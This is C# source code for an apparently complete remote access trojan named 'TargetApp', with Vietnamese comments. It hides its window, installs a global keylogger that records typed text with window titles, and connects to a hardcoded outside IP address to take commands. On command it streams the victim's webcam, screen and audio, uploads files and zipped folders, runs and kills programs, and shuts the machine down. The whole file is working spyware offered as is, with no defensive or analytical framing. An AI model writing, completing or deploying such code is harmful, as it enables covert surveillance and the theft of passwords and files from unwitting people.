using System;

using System.Drawing;

using System.Drawing.Imaging;

using System.IO;

using System.Net.Sockets;

using System.Text;

using System.Threading;

using System.Windows.Forms;

using AForge.Video;

using AForge.Video.DirectShow;

using System.Diagnostics;

using System.Runtime.InteropServices;

using System.Linq;

using System.Management;

using NAudio.Wave;

using NAudio.CoreAudioApi;



namespace TargetApp

{

    public partial class Form1 : Form

    {

        const string HOST_IP = "26.140.158.175";

        const int HOST_PORT = 9999;



        TcpClient client;

        NetworkStream stream;

        private readonly object _lockObj = new object();



        // MEDIA VARIABLES

        VideoCaptureDevice videoSource;

        WasapiLoopbackCapture audioCapture;

        bool isCamOn = false, isScreenOn = false, isAudioOn = false;

        bool isSendingCam = false, isSendingScr = false;



        // SETTINGS

        int targetWidth = 854;

        long targetQuality = 40L;



        // HOOKS

        private const int WH_KEYBOARD_LL = 13;

        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;

        private static IntPtr _hookID = IntPtr.Zero;

        private static StringBuilder keyLogBuffer = new StringBuilder();

        private static string lastActiveWindowTitle = "";



        // API (UNICODE FIXED)

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)] private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();



        // [FIX TIẾNG VIỆT] Thêm CharSet = CharSet.Unicode để đọc đúng dấu

        [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);



        [DllImport("user32.dll")] static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")] static extern uint MapVirtualKey(uint uCode, uint uMapType);



        // [FIX TIẾNG VIỆT] Đọc phím cũng dùng Unicode

        [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);



        [StructLayout(LayoutKind.Sequential)] struct CURSORINFO { public Int32 cbSize; public Int32 flags; public IntPtr hCursor; public POINT ptScreenPos; }

        [StructLayout(LayoutKind.Sequential)] struct POINT { public Int32 x; public Int32 y; }

        [DllImport("user32.dll")] static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")] static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        const Int32 CURSOR_SHOWING = 0x00000001;



        public Form1() { InitializeComponent(); CheckForIllegalCrossThreadCalls = false; this.ShowInTaskbar = false; this.Opacity = 0; this.FormBorderStyle = FormBorderStyle.None; this.Size = new Size(1, 1); this.Load += Form1_Load; this.FormClosing += Form1_FormClosing; }

        private void Form1_Load(object sender, EventArgs e) { Thread t = new Thread(ConnectLoop); t.IsBackground = true; t.Start(); _hookID = SetHook(_proc); }

        private void Form1_FormClosing(object s, FormClosingEventArgs e) { UnhookWindowsHookEx(_hookID); StopAllMedia(); }



        void ConnectLoop()

        {

            while (true)

            {

                try

                {

                    client = new TcpClient(); client.Connect(HOST_IP, HOST_PORT); stream = client.GetStream();

                    SendPacket($"INFO|{Environment.MachineName}|Ready");

                    try

                    {

                        SendPacket($"VOL_SYNC|{AudioHelper.GetVolume()}");

                        SendPacket($"BRI_SYNC|{GetCurrentBrightness()}");

                    }

                    catch { }

                    byte[] buffer = new byte[4096];

                    while (client.Connected)

                    {

                        if (stream.DataAvailable) { int len = stream.Read(buffer, 0, buffer.Length); if (len > 0) ProcessCommand(Encoding.UTF8.GetString(buffer, 0, len)); }

                        Thread.Sleep(5);

                    }

                }

                catch { Thread.Sleep(2000); }

            }

        }



        void ProcessCommand(string cmd)

        {

            try

            {

                string[] parts = cmd.Split('|'); string action = parts[0]; string param = parts.Length > 1 ? parts[1] : "";

                if (action == "AUDIO_ON") StartAudio();

                else if (action == "AUDIO_OFF") StopAudio();

                else if (action == "WEBCAM_ON") StartWebcam();

                else if (action == "WEBCAM_OFF") StopWebcam();

                else if (action == "SCREEN_ON") StartScreenShare();

                else if (action == "SCREEN_OFF") StopScreenShare();

                else if (action == "QUALITY") { string[] q = param.Split(';'); if (q.Length >= 2) { targetWidth = int.Parse(q[0]); targetQuality = long.Parse(q[1]); } }

                else if (action == "SHUTDOWN") Process.Start("shutdown", "/s /t 0");

                else if (action == "RESTART") Process.Start("shutdown", "/r /t 0");

                else if (action == "KILL_APP") { UnhookWindowsHookEx(_hookID); Application.Exit(); Environment.Exit(0); }

                else if (action == "START") { try { Process.Start(param); } catch { try { Process.Start(new ProcessStartInfo(param) { UseShellExecute = true }); } catch { } } }

                else if (action == "STOP") StopProcess(param);

                else if (action == "LIST") SendPacket("LIST|" + GetProcs());

                else if (action == "VOL_SET") AudioHelper.SetVolume(int.Parse(param));

                else if (action == "BRIGHT_SET") SetBrightness(int.Parse(param));

                else if (action == "KEYLOG") { string l = keyLogBuffer.ToString(); if (!string.IsNullOrEmpty(l)) { SendPacket("KEYLOG:\n" + l); keyLogBuffer.Clear(); } }

                else if (action == "GET_DRIVES") SendPacket("FILE_LIST|" + GetDrives());

                else if (action == "GET_DIR") SendPacket("FILE_LIST|" + GetDirectory(param));

                else if (action == "DL_FILE") SendFile(param);



                // [TÍNH NĂNG ZIP ĐƯỢC KHÔI PHỤC]

                else if (action == "DL_FOLDER") SendFolder(param);

            }

            catch { }

        }



        // [HÀM NÉN FOLDER SỬ DỤNG POWERSHELL - KHÔNG CẦN THƯ VIỆN C#]

        void SendFolder(string p)

        {

            try

            {

                if (Directory.Exists(p))

                {

                    string t = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".zip");

                    string cmd = $"Compress-Archive -Path '{p}' -DestinationPath '{t}' -Force";

                    var psi = new ProcessStartInfo("powershell", $"-Command \"{cmd}\"")

                    {

                        WindowStyle = ProcessWindowStyle.Hidden,

                        CreateNoWindow = true,

                        UseShellExecute = false

                    };

                    Process.Start(psi).WaitForExit();

                    if (File.Exists(t))

                    {

                        SendPacket($"FILE_DL|{new DirectoryInfo(p).Name}.zip|{Convert.ToBase64String(File.ReadAllBytes(t))}");

                        File.Delete(t);

                    }

                }

            }

            catch { }

        }



        // --- AUDIO ENGINE ---

        void StartAudio()

        {

            if (isAudioOn) return;

            try

            {

                audioCapture = new WasapiLoopbackCapture();

                audioCapture.DataAvailable += (s, a) => {

                    if (client != null && client.Connected && a.BytesRecorded > 0)

                    {

                        byte[] pcmBuffer = new byte[a.BytesRecorded / 2];

                        int outIndex = 0;

                        for (int i = 0; i < a.BytesRecorded; i += 4)

                        {

                            float sample = BitConverter.ToSingle(a.Buffer, i);

                            if (sample > 1.0f) sample = 1.0f;

                            if (sample < -1.0f) sample = -1.0f;

                            short val = (short)(sample * 32767);

                            BitConverter.GetBytes(val).CopyTo(pcmBuffer, outIndex);

                            outIndex += 2;

                        }

                        SendPacket("AUDIO|" + Convert.ToBase64String(pcmBuffer));

                    }

                };

                audioCapture.StartRecording();

                isAudioOn = true;

                SendPacket("KEYLOG: [AUDIO] Started 16-bit PCM Mode");

            }

            catch (Exception e)

            {

                SendPacket("KEYLOG: [AUDIO ERROR] " + e.Message);

                isAudioOn = false;

            }

        }

        void StopAudio() { if (!isAudioOn) return; try { audioCapture?.StopRecording(); audioCapture?.Dispose(); audioCapture = null; } catch { } isAudioOn = false; }

        void StopAllMedia() { StopWebcam(); StopScreenShare(); StopAudio(); }



        // --- MEDIA HELPERS ---

        void StartScreenShare() { if (isScreenOn) return; isScreenOn = true; Thread t = new Thread(ScreenLoop); t.IsBackground = true; t.Start(); }

        void StopScreenShare() { isScreenOn = false; SendPacket("SCR_OFF"); }

        void ScreenLoop() { while (isScreenOn) { try { CaptureAndSendScreen(); Thread.Sleep(50); } catch { isScreenOn = false; } } }

        void CaptureAndSendScreen() { if (isSendingScr) return; isSendingScr = true; try { Rectangle bounds = Screen.PrimaryScreen.Bounds; using (Bitmap b = new Bitmap(bounds.Width, bounds.Height)) { using (Graphics g = Graphics.FromImage(b)) { g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size); CURSORINFO p; p.cbSize = Marshal.SizeOf(typeof(CURSORINFO)); if (GetCursorInfo(out p) && p.flags == CURSOR_SHOWING) { DrawIcon(g.GetHdc(), p.ptScreenPos.x, p.ptScreenPos.y, p.hCursor); g.ReleaseHdc(); } } using (Bitmap r = ResizeImage(b, targetWidth)) { using (MemoryStream m = new MemoryStream()) { EncoderParameters e = new EncoderParameters(1); e.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, targetQuality); r.Save(m, GetEncoder(ImageFormat.Jpeg), e); SendPacket("SCR_IMG|" + Convert.ToBase64String(m.ToArray())); } } } } catch { } finally { isSendingScr = false; } }

        void StartWebcam() { try { if (isCamOn) return; var d = new FilterInfoCollection(FilterCategory.VideoInputDevice); if (d.Count == 0) return; videoSource = new VideoCaptureDevice(d[0].MonikerString); videoSource.NewFrame += (s, e) => { if (!isCamOn || isSendingCam) return; isSendingCam = true; try { using (Bitmap o = (Bitmap)e.Frame.Clone()) { using (MemoryStream m = new MemoryStream()) { EncoderParameters p = new EncoderParameters(1); p.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, targetQuality); o.Save(m, GetEncoder(ImageFormat.Jpeg), p); SendPacket("CAM_IMG|" + Convert.ToBase64String(m.ToArray())); } } Thread.Sleep(100); } catch { } finally { isSendingCam = false; } }; videoSource.Start(); isCamOn = true; } catch { } }

        void StopWebcam() { isCamOn = false; SendPacket("CAM_OFF"); try { videoSource?.SignalToStop(); videoSource?.WaitForStop(); videoSource = null; } catch { } }

        public static Bitmap ResizeImage(Image i, int w) { int h = (int)((double)i.Height * w / i.Width); Bitmap d = new Bitmap(w, h); using (Graphics g = Graphics.FromImage(d)) { g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality; g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic; g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality; g.DrawImage(i, 0, 0, w, h); } return d; }



        // --- SYSTEM HELPERS ---

        private static IntPtr SetHook(LowLevelKeyboardProc proc) { using (Process p = Process.GetCurrentProcess()) using (ProcessModule m = p.MainModule) return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(m.ModuleName), 0); }



        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)

        {

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)

            {

                int vkCode = Marshal.ReadInt32(lParam);

                string w = GetActiveWindowTitle();

                if (w != lastActiveWindowTitle)

                {

                    lastActiveWindowTitle = w;

                    if (keyLogBuffer.Length > 0) keyLogBuffer.Append("\n\n");

                    keyLogBuffer.Append($"[APP: {w}]\n");

                }

                string k = "";

                if (vkCode == 8) k = "[Back]";

                else if (vkCode == 13) k = "\n";

                else if (vkCode >= 160 && vkCode <= 165) k = "";

                else

                {

                    k = GetCharsFromKeys((uint)vkCode);

                    if (k.Length == 0 || char.IsControl(k[0])) k = $"[{(Keys)vkCode}]";

                }

                keyLogBuffer.Append(k);

            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);

        }



        private static string GetCharsFromKeys(uint k) { byte[] s = new byte[256]; GetKeyboardState(s); uint scan = MapVirtualKey(k, 0); StringBuilder sb = new StringBuilder(2); ToUnicode(k, scan, s, sb, sb.Capacity, 0); return sb.Length > 0 ? sb.ToString() : ""; }



        private static string GetActiveWindowTitle()

        {

            StringBuilder b = new StringBuilder(256);

            IntPtr h = GetForegroundWindow();

            return GetWindowText(h, b, 256) > 0 ? b.ToString() : "Unknown";

        }



        string GetDrives() { try { return "DRIVES|||" + string.Join("|||", DriveInfo.GetDrives().Where(d => d.IsReady).Select(d => $"DRIVE|{d.Name}|{d.TotalSize}")); } catch { return "ERROR"; } }

        string GetDirectory(string p) { try { StringBuilder sb = new StringBuilder(); sb.Append($"PATH|{p}|||"); foreach (var d in Directory.GetDirectories(p)) sb.Append($"DIR|{new DirectoryInfo(d).Name}|{new DirectoryInfo(d).LastWriteTime}|||"); foreach (var f in Directory.GetFiles(p)) { FileInfo fi = new FileInfo(f); sb.Append($"FILE|{fi.Name}|{Math.Max(1, fi.Length / 1024)} KB|||"); } return sb.ToString(); } catch (Exception e) { return "ERROR|" + e.Message; } }

        void SendFile(string p) { try { if (File.Exists(p)) SendPacket($"FILE_DL|{Path.GetFileName(p)}|{Convert.ToBase64String(File.ReadAllBytes(p))}"); } catch { } }

        void StopProcess(string n) { try { string c = n.ToLower().Replace(".exe", "").Trim(); int pid; if (int.TryParse(c, out pid)) Process.GetProcessById(pid).Kill(); else foreach (var p in Process.GetProcessesByName(c)) p.Kill(); } catch { } }

        string GetProcs() { return string.Join("|||", Process.GetProcesses().Select(p => $"[{p.Id}] {p.ProcessName} {(p.MainWindowTitle != "" ? $"({p.MainWindowTitle})" : "")}").OrderBy(x => x)); }

        int GetCurrentBrightness() { try { ManagementScope s = new ManagementScope("\\\\.\\root\\wmi"); ObjectQuery q = new ObjectQuery("SELECT * FROM WmiMonitorBrightness"); using (ManagementObjectSearcher sr = new ManagementObjectSearcher(s, q)) using (ManagementObjectCollection c = sr.Get()) foreach (ManagementObject m in c) return int.Parse(m["CurrentBrightness"].ToString()); } catch { } return 50; }

        void SetBrightness(int l) { try { Process.Start(new ProcessStartInfo { FileName = "powershell", Arguments = $"(Get-WmiObject -Namespace root/wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, {l})", CreateNoWindow = true, UseShellExecute = false }); } catch { } }

        void SendPacket(string m) { if (client?.Connected == true) { try { byte[] d = Encoding.UTF8.GetBytes(m); byte[] l = BitConverter.GetBytes(d.Length); lock (_lockObj) { stream.Write(l, 0, 4); stream.Write(d, 0, d.Length); } } catch { isCamOn = false; isScreenOn = false; isAudioOn = false; } } }

        private ImageCodecInfo GetEncoder(ImageFormat f) => ImageCodecInfo.GetImageDecoders().FirstOrDefault(c => c.FormatID == f.Guid);

    }



    public static class AudioHelper

    {

        public static void SetVolume(int level)

        {

            try

            {

                using (var enumerator = new MMDeviceEnumerator())

                {

                    var device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);

                    device.AudioEndpointVolume.MasterVolumeLevelScalar = level / 100.0f;

                }

            }

            catch { }

        }

        public static int GetVolume()

        {

            try

            {

                using (var enumerator = new MMDeviceEnumerator())

                {

                    var device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);

                    return (int)(device.AudioEndpointVolume.MasterVolumeLevelScalar * 100);

                }

            }

            catch { return 50; }

        }

    }

}